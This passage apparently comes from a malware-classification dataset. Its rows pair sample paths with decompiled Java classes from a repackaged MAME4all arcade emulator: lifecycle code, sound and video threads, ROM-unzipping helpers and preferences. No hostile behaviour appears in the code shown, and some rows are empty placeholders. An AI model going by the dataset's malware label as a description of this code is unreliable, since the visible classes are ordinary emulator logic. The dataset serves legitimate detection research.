Log.d(""EMULATOR"",""onResume""); super.onResume(); if (this.prefsHelper != null) { this.prefsHelper.resume(); } if (DialogHelper.savedDialog != -1) { showDialog(DialogHelper.savedDialog); }  else if (!ControlCustomizer.isEnabled()) { Emulator.resume(); } if (this.inputHandler != null && this.inputHandler.getTiltSensor() != null) { this.inputHandler.getTiltSensor().enable(); } } @Override protected void onPause(){ Log.d(""EMULATOR"",""onPause""); super.onPause(); if (this.prefsHelper != null) { this.prefsHelper.pause(); } if (!ControlCustomizer.isEnabled()) { Emulator.pause(); } if (this.inputHandler != null && this.inputHandler.getTiltSensor() != null) { this.inputHandler.getTiltSensor().disable(); } if (this.dialogHelper != null) { this.dialogHelper.removeDialogs(); } } @Override protected void onStart(){ Log.d(""EMULATOR"",""onStart""); super.onStart(); } @Override protected void onStop(){ Log.d(""EMULATOR"",""onStop""); super.onStop(); } @Override protected Dialog onCreateDialog(int id){ Dialog d; return (this.dialogHelper == null || (d=this.dialogHelper.createDialog(id)) == null) ? super.onCreateDialog(id) : d; } @Override protected void onPrepareDialog(int id,Dialog dialog){ if (this.dialogHelper != null) { this.dialogHelper.prepareDialog(id,dialog); } } @Override protected void onDestroy(){ this.mHandler.removeMessages(1); this.mHandler.removeMessages(2); this.mHandler.removeMessages(3); this.mHandler.removeMessages(4); super.onDestroy(); mbIsRunning=false; Process.killProcess(Process.myPid()); } @Override public boolean onKeyDown(int keyCode,KeyEvent event){ if (keyCode != 4) { return super.onKeyDown(keyCode,event); } new AlertDialog.Builder(this).setTitle(utility.getString(this,R.string.tishi)).setMessage(utility.getString(this,R.string.quitask)).setNegativeButton(utility.getString(this,R.string.zno),new DialogInterface.OnClickListener(){ @Override public void onClick(DialogInterface dialog,int which){ } } ).setPositiveButton(utility.getString(this,R.string.zyes),new DialogInterface.OnClickListener(){ @Override public void onClick(DialogInterface dialog,int whichButton){ MAME4all.this.finish(); } } ).show(); return true; } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\SoundThread.code","public class SoundThread implements Runnable {   protected AudioTrack audioTrack;   byte[] buff=new byte[11760];   int buff_size=0;   protected Thread t;   public void setAudioTrack(  AudioTrack audioTrack){     this.audioTrack=audioTrack;   }   public SoundThread(){     this.t=null;     this.t=new Thread(this,""sound-Thread"");     this.t.start();   }   @Override public void run(){     while (true) { synchronized (this) {         try {           wait();         }  catch (        InterruptedException e) {           e.printStackTrace();         }       }       if (this.audioTrack != null) {         this.audioTrack.write(this.buff,0,this.buff_size);       }     }   }   public synchronized void writeSample(  byte[] b,  int size){     System.arraycopy(b,0,this.buff,0,size);     this.buff_size=size;     notify();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all\VideoThread.code","public class VideoThread implements Runnable {   protected long millis;   protected Thread thread=null;   protected int i=0;   protected int fps=0;   protected Canvas canvas=null;   protected boolean run=false;   protected MAME4all mm=null;   public void setMAME4all(  MAME4all mm){     this.mm=mm;   }   public void start(){     if (this.run) {       stop();     }     this.run=true;     if (this.thread == null) {       this.thread=new Thread(this,""video-Thread"");     }     this.thread.start();   }   public void stop(){     if (this.run) {       this.run=false; synchronized (this) {         notify();       }       try {         this.thread.join();       }  catch (      InterruptedException e) {         e.printStackTrace();       }       this.thread=null;     }   }   @Override public void run(){     while (this.run) {       try { synchronized (this) {           try {             if (this.run) {               wait();               if (!this.run) {                 return;               }             }  else {               return;             }           }  catch (          InterruptedException e) {             e.printStackTrace();           }         }         ByteBuffer bf=Emulator.getScreenBuffer();         Bitmap bmp=Emulator.getEmuBitmap();         if (bf != null && bmp != null) {           if (Emulator.getVideoRenderMode() == 4) {             bf.rewind();             bmp.copyPixelsFromBuffer(bf);             bmp.getPixels(Emulator.getScreenBuffPx(),0,Emulator.getEmulatedWidth(),0,0,Emulator.getEmulatedWidth(),Emulator.getEmulatedHeight());             this.mm.getEmuView().postInvalidate();           }  else {             this.canvas=Emulator.lockCanvas();             if (this.canvas != null) {               bf.rewind();               bmp.copyPixelsFromBuffer(bf);               this.i++;               this.canvas.concat(Emulator.getMatrix());               this.canvas.drawBitmap(bmp,0.0f,0.0f,Emulator.getEmuPaint());               if (Emulator.isDebug()) {                 this.canvas.drawText(""Threaded fps:"" + this.fps + "" w:""+ Emulator.getWindow_width()+ "" h:""+ Emulator.getWindow_height(),5.0f,40.0f,Emulator.getDebugPaint());                 if (System.currentTimeMillis() - this.millis >= 1000) {                   this.fps=this.i;                   this.i=0;                   this.millis=System.currentTimeMillis();                 }               }               Emulator.unlockCanvas(this.canvas);             }           }         }       }  catch (      Exception t) {         Log.getStackTraceString(t);       }     }   }   public synchronized void update(){     notify();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.helpers\DialogHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@369c3f19"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.helpers\MainHelper.code","public class MainHelper {   public static final int BUFFER_SIZE=49152;   public static final String MAGIC_FILE=""dont-delete-00001.bin"";   public static final int SUBACTIVITY_HELP=2;   public static final int SUBACTIVITY_USER_PREFS=1;   protected MAME4all mm;   public MainHelper(  MAME4all value){     this.mm=null;     this.mm=value;   }   public String getLibDir(){     try {       if (this.mm.getCacheDir() != null) {         String cache_dir=this.mm.getCacheDir().getCanonicalPath();         String lib_dir=cache_dir.replace(""cache"",""lib"");         return lib_dir;       }       return ""/data/data/com.game.breakrev/lib"";     }  catch (    Exception e) {       e.printStackTrace();       return ""/data/data/com.game.breakrev/lib"";     }   }   public String getDefaultROMsDIR(){     try {       String res_dir=String.valueOf(Environment.getExternalStorageDirectory().getCanonicalPath()) + ""/ROMs/MAME4all/"";       return res_dir;     }  catch (    IOException e) {       e.printStackTrace();       return ""/sdcard/ROMs/MAME4all/"";     }   }   public boolean ensureROMsDir(  String roms_dir){     File res_dir=new File(roms_dir);     boolean created=false;     if (!res_dir.exists()) {       if (!res_dir.mkdirs()) {         this.mm.getDialogHelper().setErrorMsg(""Can't find/create:\n '"" + roms_dir + ""'\nIs it writeable?"");         this.mm.showDialog(2);         return false;       }       created=true;     }     String str_sav_dir=String.valueOf(roms_dir) + ""saves/"";     File sav_dir=new File(str_sav_dir);     if (!sav_dir.exists() && !sav_dir.mkdirs()) {       this.mm.getDialogHelper().setErrorMsg(""Can't find/create:\n'"" + str_sav_dir + ""'\nIs it writeable"");       this.mm.showDialog(2);       return false;     }     if (created) {       this.mm.getDialogHelper().setInfoMsg(""Created: \n'"" + roms_dir + ""'\nCopy or move your zipped ROMs under './MAME4All/roms' directory!.\n\nMAME4droid uses only 'gp2x wiz 0.37b11 MAME romset'. Google it or use clrmame.dat file included  to convert romsets from other MAME versions. See  help."");       this.mm.showDialog(3);     }     return true;   }   public static void copyFiles(  String dir,  Activity ctx,  boolean bIsforce,  String name){     try {       config.MkDir(dir);       config.MkDir(String.valueOf(dir) + File.separator + ""saves"");       if (!new File(String.valueOf(dir) + File.separator + ""saves/ok"").exists() || bIsforce) {         File fm=new File(String.valueOf(dir) + File.separator + ""saves/""+ MAGIC_FILE);         if (!fm.exists() || bIsforce) {           fm.createNewFile();           InputStream fis=ctx.getAssets().open(name);           ZipInputStream zis=new ZipInputStream(new BufferedInputStream(fis));           byte[] data=new byte[BUFFER_SIZE];           while (true) {             ZipEntry entry=zis.getNextEntry();             if (entry != null) {               if (!entry.isDirectory()) {                 String destFN=String.valueOf(dir) + File.separator + entry.getName();                 FileOutputStream fos=new FileOutputStream(destFN);                 BufferedOutputStream dest=new BufferedOutputStream(fos,BUFFER_SIZE);                 while (true) {                   int count=zis.read(data,0,BUFFER_SIZE);                   if (count == -1) {                     break;                   }  else {                     dest.write(data,0,count);                   }                 }                 dest.flush();                 dest.close();               }  else {                 File f=new File(String.valueOf(dir) + File.separator + entry.getName());                 f.mkdirs();               }             }  else {               zis.close();               config.MkDir(String.valueOf(dir) + File.separator + ""saves/ok"");               return;             }           }         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public static boolean isRomsReady(  String dir,  String strGame,  Activity ctx){     File fm=new File(String.valueOf(dir) + File.separator + strGame+ File.separator+ ""saves""+ File.separator+ ""ok"");     if (fm.exists()) {       File file=new File(String.valueOf(File.separator) + strGame + File.separator+ ""roms"");       if (file == null || !file.isDirectory()) {         return true;       }       String[] names=file.list();       for (int i=0; i < names.length; i++) {         if (names[i] != null && names[i].contains("".zip"")) {           return true;         }       }       return true;     }     return false;   }   public static void copyFilesFromApk(  String dir,  String strGame,  String strFilename,  Activity ctx,  boolean bIsforce){     String strName;     config.MkDir(dir);     config.MkDir(String.valueOf(dir) + File.separator + ""save"");     File fm=new File(String.valueOf(dir) + File.separator + strGame+ File.separator+ ""saves""+ File.separator+ ""ok"");     if (!fm.exists() || bIsforce) {       String destTemp=String.valueOf(dir) + File.separator + ""tmp.zip"";       try {         File fm2=new File(String.valueOf(dir) + File.separator + ""saves/""+ MAGIC_FILE);         try {           if (!fm2.exists() || bIsforce) {             File fin=new File(strFilename);             InputStream fis=new FileInputStream(fin);             File ftem=new File(destTemp);             if (ftem != null && (ftem.isFile() || ftem.isDirectory())) {               ftem.delete();             }             ZipInputStream zis=new ZipInputStream(new BufferedInputStream(fis));             byte[] data=new byte[BUFFER_SIZE];             while (true) {               ZipEntry entry=zis.getNextEntry();               if (entry != null) {                 if (!entry.isDirectory() && (strName=entry.getName()) != null && (strName.equals(""assets/data"") || strName.equals(""assets\\data"") || strName.equals(""assets/roms.zip"")|| strName.equals(""res/raw/roms.zip""))) {                   utility.Log("""",""copyFilesFromApk "" + strName);                   FileOutputStream fos=new FileOutputStream(destTemp);                   BufferedOutputStream dest=new BufferedOutputStream(fos,BUFFER_SIZE);                   while (true) {                     int count=zis.read(data,0,BUFFER_SIZE);                     if (count == -1) {                       break;                     }  else {                       dest.write(data,0,count);                     }                   }                   dest.flush();                   dest.close();                   copyFilesFromzip(String.valueOf(dir) + File.separator + strGame,destTemp,ctx,bIsforce);                 }               }  else {                 zis.close();                 return;               }             }           }         }  catch (        Exception e) {           e=e;           e.printStackTrace();         }       }  catch (      Exception e2) {         e=e2;       }     }   }   public static void copyFilesFromzip(  String dir,  String filename,  Activity ctx,  boolean bIsforce){     try {       config.MkDir(dir);       config.MkDir(String.valueOf(dir) + File.separator + ""save"");       File fm=new File(String.valueOf(dir) + File.separator + ""saves""+ File.separator+ ""ok"");       if (!fm.exists() || bIsforce) {         File fm2=new File(String.valueOf(dir) + File.separator + ""saves""+ File.separator+ MAGIC_FILE);         if (!fm2.exists() || bIsforce) {           InputStream fis=new FileInputStream(filename);           ZipInputStream zis=new ZipInputStream(new BufferedInputStream(fis));           byte[] data=new byte[BUFFER_SIZE];           while (true) {             ZipEntry entry=zis.getNextEntry();             if (entry != null) {               if (!entry.isDirectory()) {                 String destFN=String.valueOf(dir) + File.separator + entry.getName();                 FileOutputStream fos=new FileOutputStream(destFN);                 BufferedOutputStream dest=new BufferedOutputStream(fos,BUFFER_SIZE);                 while (true) {                   int count=zis.read(data,0,BUFFER_SIZE);                   if (count == -1) {                     break;                   }  else {                     dest.write(data,0,count);                   }                 }                 dest.flush();                 dest.close();               }  else {                 File f=new File(String.valueOf(dir) + File.separator + entry.getName());                 f.mkdirs();               }             }  else {               zis.close();               config.MkDir(String.valueOf(dir) + File.separator + ""saves""+ File.separator+ ""ok"");               return;             }           }         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void copyFiles(){     try {       String roms_dir=this.mm.getPrefsHelper().getROMsDIR();       if (!new File(String.valueOf(roms_dir) + File.separator + ""saves/ok"").exists()) {         File fm=new File(String.valueOf(roms_dir) + File.separator + ""saves/""+ MAGIC_FILE);         if (!fm.exists()) {           fm.createNewFile();           InputStream fis=this.mm.getAssets().open(""data"");           ZipInputStream zis=new ZipInputStream(new BufferedInputStream(fis));           byte[] data=new byte[BUFFER_SIZE];           while (true) {             ZipEntry entry=zis.getNextEntry();             if (entry != null) {               if (!entry.isDirectory()) {                 String destFN=String.valueOf(roms_dir) + File.separator + entry.getName();                 FileOutputStream fos=new FileOutputStream(destFN);                 BufferedOutputStream dest=new BufferedOutputStream(fos,BUFFER_SIZE);                 while (true) {                   int count=zis.read(data,0,BUFFER_SIZE);                   if (count == -1) {                     break;                   }  else {                     dest.write(data,0,count);                   }                 }                 dest.flush();                 dest.close();               }  else {                 File f=new File(String.valueOf(roms_dir) + File.separator + entry.getName());                 f.mkdirs();               }             }  else {               zis.close();               config.MkDir(String.valueOf(roms_dir) + File.separator + ""saves""+ File.separator+ ""ok"");               return;             }           }         }       }     }  catch (    Exception e) {       e.printStackTrace();     }   }   public int getscrOrientation(){     Display getOrient=this.mm.getWindowManager().getDefaultDisplay();     int orientation=this.mm.getResources().getConfiguration().orientation;     if (orientation == 0) {       Configuration config=this.mm.getResources().getConfiguration();       int orientation2=config.orientation;       if (orientation2 == 0) {         if (getOrient.getWidth() == getOrient.getHeight()) {           return 3;         }         if (getOrient.getWidth() < getOrient.getHeight()) {           return 1;         }         return 2;       }       return orientation2;     }     return orientation;   }   public void reload(){     Intent intent=this.mm.getIntent();     this.mm.overridePendingTransition(0,0);     intent.addFlags(IController.L2_VALUE);     this.mm.finish();     this.mm.overridePendingTransition(0,0);     this.mm.startActivity(intent);   }   public boolean updateOverlayFilter(){     int type;     if (getscrOrientation() == 1) {       type=this.mm.getPrefsHelper().getPortraitOverlayFilterType();     }  else {       type=this.mm.getPrefsHelper().getLandscapeOverlayFilterType();     }     if (Emulator.getOverlayFilterType() != type) {       Emulator.setOverlayFilterType(type);       reload();       return true;     }     Emulator.setOverlayFilterType(type);     return false;   }   public boolean updateVideoRender(){     if (Emulator.getVideoRenderMode() != this.mm.getPrefsHelper().getVideoRenderMode()) {       Emulator.setVideoRenderMode(this.mm.getPrefsHelper().getVideoRenderMode());       reload();       return true;     }     Emulator.setVideoRenderMode(this.mm.getPrefsHelper().getVideoRenderMode());     return false;   }   public void setBorder(){     int size=this.mm.getResources().getConfiguration().screenLayout & 15;     if ((size == 3 || size == 4) && this.mm.getMainHelper().getscrOrientation() == 1) {       FrameLayout.LayoutParams lp=(FrameLayout.LayoutParams)this.mm.getEmuView().getLayoutParams();       View v=this.mm.findViewById(R.id.EmulatorFrame);       FrameLayout.LayoutParams lp2=null;       if (this.mm.getFilterView() != null) {         lp2=(FrameLayout.LayoutParams)this.mm.getFilterView().getLayoutParams();       }       if (this.mm.getPrefsHelper().isPortraitTouchController()) {         v.setBackgroundDrawable(this.mm.getResources().getDrawable(R.drawable.border));         lp.setMargins(15,15,15,15);         if (lp2 != null) {           lp2.setMargins(15,15,15,15);           return;         }         return;       }       v.setBackgroundDrawable(null);       v.setBackgroundColor(R.color.emu_back_color);       lp.setMargins(0,0,0,0);       if (lp2 != null) {         lp2.setMargins(0,0,0,0);       }     }   }   public void updateMAME4all(){     int state;     if (!updateVideoRender() && !updateOverlayFilter()) {       View emuView=this.mm.getEmuView();       FilterView filterView=this.mm.getFilterView();       InputView inputView=this.mm.getInputView();       InputHandler inputHandler=this.mm.getInputHandler();       PrefsHelper prefsHelper=this.mm.getPrefsHelper();       String definedKeys=prefsHelper.getDefinedKeys();       String[] keys=definedKeys.split("":"");       for (int i=0; i < keys.length; i++) {         InputHandler.keyMapping[i]=Integer.valueOf(keys[i]).intValue();       }       Emulator.setValue(1,prefsHelper.isFPSShowed() ? 1 : 0);       Emulator.setValue(7,prefsHelper.isASMCores() ? 1 : 0);       Emulator.setValue(8,prefsHelper.isShowInfoWarnings() ? 1 : 0);       Emulator.setDebug(prefsHelper.isDebugEnabled());       Emulator.setValue(10,prefsHelper.isIdleWait() ? 1 : 0);       Emulator.setThreadedSound(prefsHelper.isSoundfThreaded());       setBorder();       if (prefsHelper.isTiltSensor()) {         inputHandler.getTiltSensor().enable();       }  else {         inputHandler.getTiltSensor().disable();       }       inputHandler.setTrackballSensitivity(prefsHelper.getTrackballSensitivity());       inputHandler.setTrackballEnabled(!prefsHelper.isTrackballNoMove());       int state2=this.mm.getInputHandler().getInputHandlerState();       if (getscrOrientation() == 1) {         ((IEmuView)emuView).setScaleType(prefsHelper.getPortraitScaleMode());         if (filterView != null) {           filterView.setScaleType(this.mm.getPrefsHelper().getPortraitScaleMode());         }         Emulator.setFrameFiltering(prefsHelper.isPortraitBitmapFiltering());         if (state2 == 1 && !prefsHelper.isPortraitTouchController()) {           inputHandler.changeState();         }         if (state2 == 3 && prefsHelper.isPortraitTouchController()) {           inputHandler.changeState();         }         state=this.mm.getInputHandler().getInputHandlerState();         if (state == 3) {           inputView.setVisibility(8);         }  else {           inputView.setVisibility(0);         }         if (state == 1) {           inputView.setImageDrawable(this.mm.getResources().getDrawable(R.drawable.back_portrait));           inputHandler.readControllerValues(R.raw.controller_portrait);         }         if (ControlCustomizer.isEnabled()) {           ControlCustomizer.setEnabled(false);           this.mm.getDialogHelper().setInfoMsg(""Control layout customization is only allowed in landscape mode"");           this.mm.showDialog(3);         }       }  else {         ((IEmuView)emuView).setScaleType(this.mm.getPrefsHelper().getLandscapeScaleMode());         if (filterView != null) {           filterView.setScaleType(this.mm.getPrefsHelper().getLandscapeScaleMode());         }         Emulator.setFrameFiltering(this.mm.getPrefsHelper().isLandscapeBitmapFiltering());         if (state2 == 1 && !prefsHelper.isLandscapeTouchController()) {           inputHandler.changeState();         }         if (state2 == 3 && prefsHelper.isLandscapeTouchController()) {           inputHandler.changeState();         }         state=this.mm.getInputHandler().getInputHandlerState();         inputView.bringToFront();         if (state == 3) {           inputView.setVisibility(8);         }  else {           inputView.setVisibility(0);         }         if (state == 1) {           inputView.setImageDrawable(null);           inputHandler.readControllerValues(R.raw.controller_landscape);           if (ControlCustomizer.isEnabled()) {             this.mm.getEmuView().setVisibility(4);             this.mm.getInputView().requestFocus();           }         }  else         if (ControlCustomizer.isEnabled()) {           ControlCustomizer.setEnabled(false);           this.mm.getDialogHelper().setInfoMsg(""Control layout customization is only allowed when touch controller is visible"");           this.mm.showDialog(3);         }       }       int op=inputHandler.getOpacity();       if (op != -1 && state == 1) {         inputView.setAlpha(op);       }       inputView.requestLayout();       emuView.requestLayout();       if (filterView != null) {         filterView.requestLayout();       }       inputView.invalidate();       emuView.invalidate();       if (filterView != null) {         filterView.invalidate();       }     }   }   public void showWeb(){     Intent browserIntent=new Intent(""android.intent.action.VIEW"",Uri.parse(""https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=seleuco%2enicator%40gmail%2ecom&lc=US&item_name=Seleuco%20Nicator&item_number=ixxxx4all&no_note=0&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHostedGuest""));     this.mm.startActivity(browserIntent);   }   public void showSettings(){     Intent i=new Intent(this.mm,(Class<?>)UserPreferences.class);     this.mm.startActivityForResult(i,1);   }   public void showHelp(){     Intent i2=new Intent(this.mm,(Class<?>)HelpActivity.class);     this.mm.startActivityForResult(i2,2);   }   public void activityResult(  int requestCode,  int resultCode,  Intent data){     if (requestCode == 1) {       updateMAME4all();     }   }   public ArrayList<Integer> measureWindow(  int widthMeasureSpec,  int heightMeasureSpec,  int scaleType){     int widthSize;     int heightSize;     int newHeight;     if (scaleType == 6) {       widthSize=View.MeasureSpec.getSize(widthMeasureSpec);       heightSize=View.MeasureSpec.getSize(heightMeasureSpec);     }  else {       int emu_w=Emulator.getEmulatedWidth();       int emu_h=Emulator.getEmulatedHeight();       if (scaleType == 2) {         emu_w=(int)(emu_w * 1.5f);         emu_h=(int)(emu_h * 1.5f);       }       if (scaleType == 3) {         emu_w*=2;         emu_h*=2;       }       if (scaleType == 4) {         emu_w=(int)(emu_w * 2.5f);         emu_h=(int)(emu_h * 2.5f);       }       int w=emu_w;       int h=emu_h;       int widthSize2=View.MeasureSpec.getSize(widthMeasureSpec);       int heightSize2=View.MeasureSpec.getSize(heightMeasureSpec);       if (heightSize2 == 0) {         heightSize2=1;       }       if (widthSize2 == 0) {         widthSize2=1;       }       float scale=1.0f;       if (scaleType == 5) {         scale=Math.min(widthSize2 / w,heightSize2 / h);       }       float desiredAspect=emu_w / emu_h;       widthSize=Math.min((int)(w * scale),widthSize2);       heightSize=Math.min((int)(h * scale),heightSize2);       float actualAspect=widthSize / heightSize;       if (Math.abs(actualAspect - desiredAspect) > 1.0E-7d) {         boolean done=false;         int newWidth=(int)(heightSize * desiredAspect);         if (newWidth <= widthSize) {           widthSize=newWidth;           done=true;         }         if (!done && (newHeight=(int)(widthSize / desiredAspect)) <= heightSize) {           heightSize=newHeight;         }       }     }     ArrayList<Integer> l=new ArrayList<>();     l.add(new Integer(widthSize));     l.add(new Integer(heightSize));     return l;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.helpers\MenuHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@34cfe691"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.seleuco.mame4all.helpers\PrefsHelper.code","public class PrefsHelper implements SharedPreferences.OnSharedPreferenceChangeListener {   public static final int PREF_15X=2;   public static final int PREF_20X=3;   public static final int PREF_25X=4;   public static final String PREF_ANALOG_DZ=""PREF_ANALOG_DZ"";   public static final int PREF_ANALOG_FAST=2;   public static final int PREF_ANALOG_PRETTY=3;   public static final String PREF_ANIMATED_INPUT=""PREF_ANIMATED_INPUT"";   public static final String PREF_CONTROLLER_TYPE=""PREF_CONTROLLER_TYPE"";   public static final int PREF_CRT_1=4;   public static final int PREF_CRT_2=5;   public static final String PREF_DEFINED_CONTROL_LAYOUT=""PREF_DEFINED_CONTROL_LAYOUT"";   public static final String PREF_DEFINED_KEYS=""PREF_DEFINED_KEYS"";   public static final int PREF_DIGITAL=1;   public static final int PREF_FILTER_NONE=1;   public static final int PREF_FILTER_SCANLINE_1=2;   public static final int PREF_FILTER_SCANLINE_2=3;   public static final String PREF_GLOBAL_ASMCORES=""PREF_GLOBAL_ASMCORES"";   public static final String PREF_GLOBAL_DEBUG=""PREF_GLOBAL_DEBUG"";   public static final String PREF_GLOBAL_IDLE_WAIT=""PREF_GLOBAL_IDLE_WAIT"";   public static final String PREF_GLOBAL_SHOW_FPS=""PREF_GLOBAL_SHOW_FPS"";   public static final String PREF_GLOBAL_SHOW_INFOWARNINGS=""PREF_GLOBAL_SHOW_INFOWARNINGS"";   public static final String PREF_GLOBAL_SOUND_THREADED=""PREF_GLOBAL_SOUND_THREADED"";   public static final String PREF_GLOBAL_VIDEO_RENDER_MODE=""PREF_GLOBAL_VIDEO_RENDER_MODE"";   public static final int PREF_INPUT_DEFAULT=1;   public static final String PREF_INPUT_EXTERNAL=""PREF_INPUT_EXTERNAL"";   public static final int PREF_INPUT_ICADE=2;   public static final int PREF_INPUT_ICP=3;   public static final String PREF_LANDSCAPE_BITMAP_FILTERING=""PREF_LANDSCAPE_BITMAP_FILTERING"";   public static final String PREF_LANDSCAPE_CONTROLLER_TYPE=""PREF_LANDSCAPE_CONTROLLER_TYPE"";   public static final String PREF_LANDSCAPE_FILTER_TYPE=""PREF_LANDSCAPE_FILTER_2"";   public static final String PREF_LANDSCAPE_SCALING_MODE=""PREF_LANDSCAPE_SCALING_MODE_2"";   public static final String PREF_LANDSCAPE_TOUCH_CONTROLLER=""PREF_LANDSCAPE_TOUCH_CONTROLLER"";   public static final int PREF_ORIGINAL=1;   public static final String PREF_PORTRAIT_BITMAP_FILTERING=""PREF_PORTRAIT_BITMAP_FILTERING"";   public static final String PREF_PORTRAIT_FILTER_TYPE=""PREF_PORTRAIT_FILTER_2"";   public static final String PREF_PORTRAIT_SCALING_MODE=""PREF_PORTRAIT_SCALING_MODE_2"";   public static final String PREF_PORTRAIT_TOUCH_CONTROLLER=""PREF_PORTRAIT_TOUCH_CONTROLLER"";   public static final int PREF_RENDER_GL=3;   public static final int PREF_RENDER_HW=4;   public static final int PREF_RENDER_NORMAL=1;   public static final int PREF_RENDER_THREADED=2;   public static final String PREF_ROMsDIR=""PREF_ROMsDIR"";   public static final int PREF_SCALE=5;   public static final int PREF_STRETCH=6;   public static final String PREF_TILT_DZ=""PREF_TILT_DZ"";   public static final String PREF_TILT_SENSITIVITY=""PREF_TILT_SENSITIVITY"";   public static final String PREF_TILT_SENSOR=""PREF_TILT_SENSOR"";   public static final String PREF_TOUCH_DZ=""PREF_TOUCH_DZ"";   public static final String PREF_TRACKBALL_NOMOVE=""PREF_TRACKBALL_NOMOVE"";   public static final String PREF_TRACKBALL_SENSITIVITY=""PREF_TRACKBALL_SENSITIVITY"";   public static final String PREF_VIBRATE=""PREF_VIBRATE"";   protected MAME4all mm;   public PrefsHelper(  MAME4all value){     this.mm=null;     this.mm=value;   }   @Override public void onSharedPreferenceChanged(  SharedPreferences sharedPreferences,  String key){   }   public void resume(){     Context context=this.mm.getApplicationContext();     SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(context);     prefs.registerOnSharedPreferenceChangeListener(this);   }   public void pause(){     Context context=this.mm.getApplicationContext();     SharedPreferences prefs=PreferenceManager.getDefaultSharedPreferences(context);     prefs.unregisterOnSharedPreferenceChangeListener(this);   }   protected SharedPreferences getSharedPreferences(){     Context context=this.mm.getApplicationContext();     return PreferenceManager.getDefaultSharedPreferences(context);   }   public int getPortraitScaleMode(){     return Integer.valueOf(getSharedPreferences().getString(PREF_PORTRAIT_SCALING_MODE,""5"")).intValue();   }   public int getLandscapeScaleMode(){     return !MAME4all.sbisminfirst ? Integer.valueOf(getSharedPreferences().getString(PREF_LANDSCAPE_SCALING_MODE,""5"")).intValue() : Integer.valueOf(getSharedPreferences().getString(PREF_LANDSCAPE_SCALING_MODE,""6"")).intValue();   }   public int getPortraitOverlayFilterType(){     return Integer.valueOf(getSharedPreferences().getString(PREF_PORTRAIT_FILTER_TYPE,""1"")).intValue();   }   public int getLandscapeOverlayFilterType(){     return Integer.valueOf(getSharedPreferences().getString(PREF_LANDSCAPE_FILTER_TYPE,""1"")).intValue();   }   public boolean isPortraitTouchController(){     return getSharedPreferences().getBoolean(PREF_PORTRAIT_TOUCH_CONTROLLER,true);   }   public boolean isPortraitBitmapFiltering(){     return getSharedPreferences().getBoolean(PREF_PORTRAIT_BITMAP_FILTERING,false);   }   public boolean isLandscapeTouchController(){     return getSharedPreferences().getBoolean(PREF_LANDSCAPE_TOUCH_CONTROLLER,true);   }   public boolean isLandscapeBitmapFiltering(){     return getSharedPreferences().getBoolean(PREF_LANDSCAPE_BITMAP_FILTERING,false);   }   public String getDefinedKeys(){     SharedPreferences p=getSharedPreferences();     StringBuffer defaultKeys=new StringBuffer();     for (int i=0; i < InputHandler.defaultKeyMapping.length; i++) {       defaultKeys.append(String.valueOf(InputHandler.defaultKeyMapping[i]) + "":"");     }     return p.getString(PREF_DEFINED_KEYS,defaultKeys.toString());   }   public int getTrackballSensitivity(){     return getSharedPreferences().getInt(PREF_TRACKBALL_SENSITIVITY,3);   }   public boolean isTrackballNoMove(){     return getSharedPreferences().getBoolean(PREF_TRACKBALL_NOMOVE,false);   }   public int getVideoRenderMode(){     return Integer.valueOf(getSharedPreferences().getString(PREF_GLOBAL_VIDEO_RENDER_MODE,""2"")).intValue();   }   public boolean isSoundfThreaded(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_SOUND_THREADED,true);   }   public boolean isFPSShowed(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_SHOW_FPS,false);   }   public boolean isDebugEnabled(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_DEBUG,false);   }   public boolean isIdleWait(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_IDLE_WAIT,true);   }   public boolean isAnimatedInput(){     return getSharedPreferences().getBoolean(PREF_ANIMATED_INPUT,true);   }   public boolean isTouchDZ(){     return getSharedPreferences().getBoolean(PREF_TOUCH_DZ,true);   }   public boolean isASMCores(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_ASMCORES,true);   }   public boolean isShowInfoWarnings(){     return getSharedPreferences().getBoolean(PREF_GLOBAL_SHOW_INFOWARNINGS,true);   }   public int getControllerType(){     return Integer.valueOf(getSharedPreferences().getString(PREF_CONTROLLER_TYPE,""2"")).intValue();   }   public int getInputExternal(){     return Integer.valueOf(getSharedPreferences().getString(PREF_INPUT_EXTERNAL,""1"")).intValue();   }   public int getAnalogDZ(){     return Integer.valueOf(getSharedPreferences().getString(PREF_ANALOG_DZ,""1"")).intValue();   }   public boolean isVibrate(){     return getSharedPreferences().getBoolean(PREF_VIBRATE,true);   }   public String getROMsDIR(){     return getSharedPreferences().getString(PREF_ROMsDIR,null);   }   public void setROMsDIR(  String value){     SharedPreferences.Editor editor=getSharedPreferences().edit();     editor.putString(PREF_ROMsDIR,value);     editor.commit();   }   public String getDefinedControlLayout(){     return getSharedPreferences().getString(PREF_DEFINED_CONTROL_LAYOUT,null);   }   public void setDefinedControlLayout(  String value){     SharedPreferences.Editor editor=getSharedPreferences().edit();     editor.putString(PREF_DEFINED_CONTROL_LAYOUT,value);     editor.commit();   }   public boolean isTiltSensor(){     return getSharedPreferences().getBoolean(PREF_TILT_SENSOR,false);   }   public int getTiltSensitivity(){     return getSharedPreferences().getInt(PREF_TILT_SENSITIVITY,6);   }   public int getTiltDZ(){     return Integer.valueOf(getSharedPreferences().getString(PREF_TILT_DZ,""3"")).intValue();   } } "
